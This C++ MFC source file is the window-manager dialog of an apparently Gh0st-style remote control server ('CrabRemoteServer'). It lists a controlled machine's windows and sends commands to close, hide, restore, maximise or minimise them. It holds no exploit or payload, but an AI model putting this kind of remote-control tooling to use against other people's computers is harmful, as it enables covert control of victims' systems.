// WindowManager.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "WindowManager.h"
#include "afxdialogex.h"
#include"Common.h"

// CWindowManager 对话框

IMPLEMENT_DYNAMIC(CWindowManagerDlg, CDialogEx)

CWindowManagerDlg::CWindowManagerDlg(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_WINDOW_MANAGER_DIALOG, pParent)
{

	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;
}

CWindowManagerDlg::~CWindowManagerDlg()
{
}

void CWindowManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//  DDX_Control(pDX, IDC_WINDOW_MANAGER_LIST, m_WindowManagerList);
	DDX_Control(pDX, IDC_WINDOW_MANAGER_LIST, m_WindowInfoList);
}


BEGIN_MESSAGE_MAP(CWindowManagerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_COMMAND(ID_REFRESH_WINDOW, &CWindowManagerDlg::OnRefreshWindow)
	ON_COMMAND(ID_CLOSE_WINDOW, &CWindowManagerDlg::OnCloseWindow)
	ON_COMMAND(ID_HIDE_WINDOW, &CWindowManagerDlg::OnHideWindow)
	ON_COMMAND(ID_RECOVER_WINDOW, &CWindowManagerDlg::OnRecoverWindow)
	ON_COMMAND(ID_MAX_WINDOW, &CWindowManagerDlg::OnMaxWindow)
	ON_COMMAND(ID_MIN_WINDOW, &CWindowManagerDlg::OnMinWindow)
	ON_NOTIFY(NM_RCLICK, IDC_WINDOW_MANAGER_LIST, &CWindowManagerDlg::OnRclickWindowManagerList)
END_MESSAGE_MAP()


// CWindowManager 消息处理程序


void CWindowManagerDlg::ShowWindowInfoList(void)
{
	char* BufferData = (char*)(m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1));
	DWORD	Offset = 0;
	char* WindowTitleName = NULL;
	bool bDel = false;

	m_WindowInfoList.DeleteAllItems();
	CString	v1;
	int i;
	for (i = 0; Offset < m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1; i++)
	{
		PULONG_PTR	Hwnd = PULONG_PTR(BufferData + Offset);   //窗口句柄
		WindowTitleName = (char*)BufferData + Offset + sizeof(HWND);   //窗口标题  [][4][HelloWorld][8][]  
		v1.Format("%5u", *Hwnd);
		m_WindowInfoList.InsertItem(i, v1);
		m_WindowInfoList.SetItemText(i, 1, WindowTitleName);
		m_WindowInfoList.SetItemText(i, 2, "显示");
		// ItemData 为窗口句柄
		m_WindowInfoList.SetItemData(i, *Hwnd);
		Offset += sizeof(HWND) + lstrlen(WindowTitleName) + 1;
	}
	v1.Format(_T("窗口个数 / %d"), i);   //修改CtrlList 
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = v1.GetBuffer(0);
	lvc.cchTextMax = v1.GetLength();
	m_WindowInfoList.SetColumn(2, &lvc);
}

void CWindowManagerDlg::RefreshWindowInfoList(void)
{
	m_WindowInfoList.DeleteAllItems();
	ShowWindowInfoList();
}

BOOL CWindowManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));

	//获取客户端Ip得走
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->clientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 


	v1.Format(_T("\\\\%s - 远程窗口管理"), IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);




	LOGFONT  Logfont;
	CFont* v2 = m_WindowInfoList.GetFont();
	v2->GetLogFont(&Logfont);
	//调整比例
	Logfont.lfHeight = Logfont.lfHeight * 1.3;   //这里可以修改字体的高比例
	Logfont.lfWidth = Logfont.lfWidth * 1.3;     //这里可以修改字体的宽比例
	CFont  v3;
	v3.CreateFontIndirect(&Logfont);
	m_WindowInfoList.SetFont(&v3);
	v3.Detach();




	//被控端传回的数据
	char* BufferData = (char*)(m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0));
	m_WindowInfoList.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	switch (BufferData[0])
	{
	case CLIENT_WINDOW_MANAGER_REPLY:
	{

		m_WindowInfoList.InsertColumn(0, _T("窗口句柄"), LVCFMT_LEFT, 80);
		m_WindowInfoList.InsertColumn(1, _T("窗口名称"), LVCFMT_LEFT, 300);
		m_WindowInfoList.InsertColumn(2, _T("窗口状态"), LVCFMT_LEFT, 300);
		ShowWindowInfoList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0
		break;
	}
	default:
		break;
	}
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CWindowManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		m_ContextObject->ProcessDlg = NULL;
		m_ContextObject->DlgIdentity = 0;
		CancelIo((HANDLE)m_ContextObject->clientSocket);
		closesocket(m_ContextObject->clientSocket);
	}
	CDialogEx::OnClose();
}


void CWindowManagerDlg::OnRefreshWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];
	ZeroMemory(BufferData, 20);
	BufferData[0] = CLIENT_WINDOW_MANAGER_REFRESH_REQUIRE;           //注意这个就是我们的数据头
	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

}


void CWindowManagerDlg::OnCloseWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];


	int	Item = m_WindowInfoList.GetSelectionMark();
	if (Item >= 0)
	{

		ZeroMemory(BufferData, 20);
		BufferData[0] = CLIENT_WINDOW_MANAGER_CLOSE_REQUIRE;           //注意这个就是我们的数据头

		HWND Hwnd = (HWND)m_WindowInfoList.GetItemData(Item); //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
		memcpy(BufferData + 1, &Hwnd, sizeof(HWND));   //1 4
		m_WindowInfoList.DeleteItem(Item);
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

	}
}


void CWindowManagerDlg::OnHideWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];


	int	Item = m_WindowInfoList.GetSelectionMark();
	if (Item >= 0)
	{

		ZeroMemory(BufferData, 20);
		BufferData[0] = CLIENT_WINDOW_MANAGER_HIDE_REQUIRE;           //注意这个就是我们的数据头

		m_WindowInfoList.SetItemText(Item, 2, _T("隐藏"));      //注意这时将列表中的显示状态为"隐藏"
		HWND Hwnd = (HWND)m_WindowInfoList.GetItemData(Item); //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
		memcpy(BufferData + 1, &Hwnd, sizeof(HWND));   //1 4
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

	}
}


void CWindowManagerDlg::OnRecoverWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];


	int	Item = m_WindowInfoList.GetSelectionMark();
	if (Item >= 0)
	{

		ZeroMemory(BufferData, 20);
		BufferData[0] = CLIENT_WINDOW_MANAGER_RECOVER_REQUIRE;           //注意这个就是我们的数据头

		m_WindowInfoList.SetItemText(Item, 2, _T("显示"));      //注意这时将列表中的显示状态为"隐藏"
		HWND Hwnd = (HWND)m_WindowInfoList.GetItemData(Item); //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
		memcpy(BufferData + 1, &Hwnd, sizeof(HWND));   //1 4
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

	}
}


void CWindowManagerDlg::OnMaxWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];


	int	Item = m_WindowInfoList.GetSelectionMark();
	if (Item >= 0)
	{

		ZeroMemory(BufferData, 20);
		BufferData[0] = CLIENT_WINDOW_MANAGER_MAX_REQUIRE;           //注意这个就是我们的数据头
		HWND Hwnd = (HWND)m_WindowInfoList.GetItemData(Item); //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
		memcpy(BufferData + 1, &Hwnd, sizeof(HWND));   //1 4
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

	}
}


void CWindowManagerDlg::OnMinWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE BufferData[20];


	int	Item = m_WindowInfoList.GetSelectionMark();
	if (Item >= 0)
	{

		ZeroMemory(BufferData, 20);
		BufferData[0] = CLIENT_WINDOW_MANAGER_MIN_REQUIRE;           //注意这个就是我们的数据头
		HWND Hwnd = (HWND)m_WindowInfoList.GetItemData(Item); //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
		memcpy(BufferData + 1, &Hwnd, sizeof(HWND));   //1 4
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(BufferData));

	}
}


void CWindowManagerDlg::OnRclickWindowManagerList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu Menu;
	Menu.LoadMenu(IDR_CLIENT_WINDOW_MENU);
	CPoint Point;
	GetCursorPos(&Point);
	SetForegroundWindow();   //设置当前窗口
	Menu.GetSubMenu(0)->TrackPopupMenu(
		TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL);
	*pResult = 0;
}
